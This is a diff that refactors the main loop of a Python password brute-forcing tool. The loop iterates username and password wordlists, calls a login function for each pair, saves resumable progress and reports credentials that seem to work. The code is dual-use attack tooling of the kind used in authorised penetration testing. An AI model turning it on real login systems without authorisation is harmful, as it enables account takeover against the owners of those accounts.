@@ -44,27 +44,27 @@ def run_brute_force() -> None:
         print(f"{timestamp()} {red_bold}[!] Failed to create session.{reset_text}")
         return
 
-    known_success: Union[List[str], Set[str]] = load_file(SUCCESS_FILE_PATH, as_set=True)
+    successes_list: Union[List[str], Set[str]] = load_file(SUCCESS_FILE_PATH, as_set=True)
     progress_list: Union[List[str], Set[str]] = load_file(PROGRESS_FILE_PATH)
     last_saved_combo: Optional[str] = progress_list[-1] if progress_list else None
     resume: bool = last_saved_combo is None
     possible_success: bool = False
 
-    usernames = load_file(USERNAMES_FILE_PATH)
-    passwords = load_file(PASSWORDS_FILE_PATH)
-    if not usernames or not passwords:
+    usernames_list = load_file(USERNAMES_FILE_PATH)
+    passwords_list = load_file(PASSWORDS_FILE_PATH)
+    if not usernames_list or not passwords_list:
         print(f"{timestamp()} {red_bold}[!] Username or password files are empty.{reset_text}")
         return
 
-    combinations_to_test = len(usernames) * len(passwords)
-    print(f"{timestamp()} [*] Combinations to test: {bold_text}{combinations_to_test}{reset_text}")
+    total: int = len(usernames_list) * len(passwords_list)
+    print(f"{timestamp()} [*] Combinations to test: {bold_text}{total}{reset_text}")
 
     if resume:
         print(f"{timestamp()} {bold_text}[*] No previous progress found. Starting from the beginning.{reset_text}")
     else:
-        current_index: int = (usernames.index(last_saved_combo.split(':')[0]) * len(passwords) +
-                         passwords.index(last_saved_combo.split(':')[1]) + 1) if last_saved_combo else 0
-        print(f"{timestamp()} {bold_text}[*] Last saved combination index: {current_index}{reset_text}\n"
+        current_index: int = (usernames_list.index(last_saved_combo.split(':')[0]) * len(passwords_list) +
+                         passwords_list.index(last_saved_combo.split(':')[1]) + 1) if last_saved_combo else 0
+        print(f"{timestamp()} {bold_text}[*] Last saved combination: index {current_index}{reset_text}\n"
             f"{timestamp()} {bold_text}[*] Last saved combination: {last_saved_combo}{reset_text}\n"
             f"{timestamp()} {bold_text}[*] Resuming from last saved combination.{reset_text}")
 
@@ -72,11 +72,11 @@ def run_brute_force() -> None:
     previous_tested_combo: Optional[str] = None
     attempt_counter = 0
     try:
-        for username in usernames:
-            for password in passwords:
+        for username in usernames_list:
+            for password in passwords_list:
                 combo = f"{username}:{password}"
 
-                if combo in known_success:
+                if combo in successes_list:
                     continue
 
                 if not resume:
@@ -85,21 +85,20 @@ def run_brute_force() -> None:
                     continue
 
                 possible_success, attempt_counter = try_login(
-                    session, known_success, username, password, attempt_counter
+                    session, successes_list, username, password, attempt_counter
                 )
                 save_to_file(PROGRESS_FILE_PATH, combo, overwrite=True)
                 previous_tested_combo: Optional[str] = combo
 
-                attempt: int = len(passwords) * usernames.index(username) + passwords.index(password) + 1
-                total: int = len(usernames) * len(passwords)
+                this_attempt_index: int = len(passwords_list) * usernames_list.index(username) + passwords_list.index(password) + 1
 
                 padding = " " * max(0, _prev_len - len(combo))
                 _prev_len = len(combo)
                 if possible_success:
-                    print(f"\n{timestamp()} {green_bold}[+] Attempt {attempt}/{total} successful: {combo}{reset_text}"
+                    print(f"\n{timestamp()} {green_bold}[+] Attempt {this_attempt_index}/{total} successful: {combo}{reset_text}"
                           f"\n{timestamp()} {bold_text}[?] It can be a false positive, please verify this credential manually.{reset_text}")
                 else:
-                    print(f"\r{timestamp()} [-] Attempt {attempt}/{total} failed: {combo}{padding}", end="", flush=True)
+                    print(f"\r{timestamp()} [-] Attempt {this_attempt_index}/{total} failed: {combo}{padding}", end="", flush=True)
 
     except (KeyboardInterrupt, Exception) as e:
         if isinstance(e, KeyboardInterrupt):
@@ -109,12 +108,12 @@ def run_brute_force() -> None:
         if combo:
             save_to_file(PROGRESS_FILE_PATH, previous_tested_combo, overwrite=True)
             print(f"{timestamp()} {bold_text}[*] Progress saved in {PROGRESS_FILE_PATH}.{reset_text}")
-        summary = create_results_summary(known_success, possible_success)
+        summary = create_results_summary(successes_list, possible_success)
         print(summary)
         raise SystemExit(1)
 
     print(f"{timestamp()} {bold_text}[*] Brute-force attack completed.{reset_text}")
-    summary = create_results_summary(known_success, possible_success)
+    summary = create_results_summary(successes_list, possible_success)
     print(summary)
 
 
